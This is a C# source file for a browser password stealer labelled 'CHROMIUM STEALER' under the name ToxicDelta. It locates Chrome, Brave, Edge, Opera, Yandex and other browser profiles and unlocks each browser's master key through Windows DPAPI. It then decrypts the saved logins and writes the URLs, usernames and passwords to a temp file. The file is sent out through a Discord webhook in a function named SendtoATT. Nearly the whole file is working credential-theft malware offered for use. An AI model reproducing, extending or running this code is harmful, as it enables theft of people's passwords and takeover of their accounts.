using Discord;
using Discord.Webhook;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

#pragma warning disable CS0028

namespace ToxicDelta.Chromium
{
    /*
     * CHROMIUM STEALER
    */
    class ChromiumPasswords
    {
        public static string TempPath = Path.Combine(Path.GetTempPath(), "Browser");
        public static List<string> Profiles = new List<string> {
            "Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"
        };

        public static Dictionary<string, string> Browsers = new Dictionary<string, string>()
        {
            { "Chrome", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data" },
            { "Brave", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\BraveSoftware\Brave-Browser\User Data" },
            { "Edge", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Edge\User Data" },
            { "Opera", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera Stable" },
            { "Opera GX", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera GX Stable" },
            { "Vivaldi", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Vivaldi\User Data\Default\Login Data" },
            { "Epic Privacy Browser", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Epic Privacy Browser\User Data" },
            { "Yandex", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Yandex\YandexBrowser\User Data" }
        };

        private static void DumpAllPasswords(string webhookUrl)
        {
            Directory.CreateDirectory(TempPath);

            foreach (var browser in Browsers)
            {
                string name = browser.Key;
                string basePath = browser.Value;

                if (!Directory.Exists(basePath)) continue;

                string localStatePath = Path.Combine(basePath, "Local State");
                if (!File.Exists(localStatePath)) continue;

                byte[] masterKey = GetMasterKey(localStatePath);
                if (masterKey == null) continue;

                foreach (var profile in Profiles)
                {
                    string loginDataPath = name.ToLower().Contains("opera")
                        ?Path.Combine(basePath, "Login Data")
                        :Path.Combine(basePath, profile, "Login Data");

                    if (!File.Exists(loginDataPath)) continue;
                    DumpPasswords(name, loginDataPath, masterKey, webhookUrl);
                }
            }
        }

        private static async void DumpPasswords(string browserName, string dbPath, byte[] masterKey, string webhookUrl)
        {
            string tempDb = Path.GetTempFileName();
            File.Copy(dbPath, tempDb, true);

            string outputFile = Path.Combine(TempPath, "passwords.txt");

            using (var conn = new SQLiteConnection($"Data Source={tempDb};"))
            {
                conn.Open();
                using (var cmd = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", conn))
                using (var reader = cmd.ExecuteReader())
                using (var writer = new StreamWriter(outputFile, true, Encoding.UTF8))
                {
                    if (new FileInfo(outputFile).Length == 0)
                        writer.WriteLine(@" 
___________          .__       ________         .__   __          
\__    ___/______  __|__| ____ \______ \   ____ |  |_/  |______   
  |    | /  _ \  \/  /  |/ ___\ |    |  \_/ __ \|  |\   __\__  \  
  |    |(  <_> >    <|  \  \___ |    `   \  ___/|  |_|  |  / __ \_
  |____| \____/__/\_ \__|\___  >_______  /\___  >____/__| (____  /
                    \/       \/        \/     \/               \/ 
                made by v1s0or
" + "\n");

                    while (reader.Read())
                    {
                        string url = reader.GetString(0);
                        string user = reader.GetString(1);
                        byte[] encrypted = (byte[])reader["password_value"];
                        string decrypted = DecryptPassword(encrypted, masterKey);
                        DateTime now = DateTime.Now;
                        writer.WriteLine($"Date: " + now.ToString());

                        if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(user) && !string.IsNullOrEmpty(decrypted))
                        {
                            writer.WriteLine($"[+] {browserName}" + "\n");
                            writer.WriteLine($"URL: {url}");
                            writer.WriteLine($"USER: {user}");
                            writer.WriteLine($"PASSWORD: {decrypted}" + "\n");
                        }
                    }
                }
                await SendtoATT(webhookUrl, outputFile);
            }
            Console.WriteLine("[+] Passwords sent to attacker.");
            File.Delete(tempDb);
        }

        private static async Task SendtoATT(string webhookUrl, string outputFile)
        {
            await Task.Delay(5000); // to get everything done before sending

            var dumper = new DiscordWebhookClient(webhookUrl);
            var fileAttachment = new FileAttachment(outputFile);

            try
            {
                await dumper.SendFilesAsync(new[] { fileAttachment }, "Dumped Passwords", username: "ToxicDelta");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"hi theres an error :3 : {ex.Message}");
            }
        }

        public static byte[] GetMasterKey(string localStatePath)
        {
            try
            {
                string content = File.ReadAllText(localStatePath);
                dynamic json = JsonConvert.DeserializeObject(content);
                string encKey = json["os_crypt"]["encrypted_key"];
                byte[] encryptedKey = Convert.FromBase64String(encKey);
                byte[] trimmed = new byte[encryptedKey.Length - 5];
                Array.Copy(encryptedKey, 5, trimmed, 0, trimmed.Length);
                return ProtectedData.Unprotect(trimmed, null, DataProtectionScope.CurrentUser);
            }
            catch
            {
                return null;
            }
        }

        public static string DecryptPassword(byte[] encryptedData, byte[] masterKey)
        {
            try
            {
                return ChromeAES.Decrypt(encryptedData, masterKey);
            }
            catch
            {
                return "[ --- Decryption Failed --- ]";
            }
        }

        public static void MainPSWR(string webhookUrl)
        {
            DumpAllPasswords(webhookUrl);
            Console.WriteLine("[+] Passwords dumped to: " + Path.Combine(TempPath, "passwords.txt"));
            Console.ResetColor();
        }
    }
}
